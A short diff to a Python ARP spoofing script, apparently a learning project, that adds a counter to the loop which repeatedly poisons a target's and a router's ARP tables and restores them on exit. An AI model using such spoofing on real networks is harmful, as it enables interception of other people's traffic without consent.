@@ -65,11 +65,14 @@ def restore_ARP(target_ip, pretending_ip):
     scapy.send(restore_packet, verbose=False)
 
 # trick the router and the target. When the attack is over - ctrl + c detected, restore ARP table
+
+counter = 1
 try:
     while True:
         arp_spoof(options.target_ip, options.router_ip)
         arp_spoof(options.router_ip, options.target_ip)
-        print('packets sent')
+        print('packets sent' + str(counter))
+        counter += 1
         time.sleep(1)
 except KeyboardInterrupt:
     print("\nrestoring target and router's ARP table and quitting")
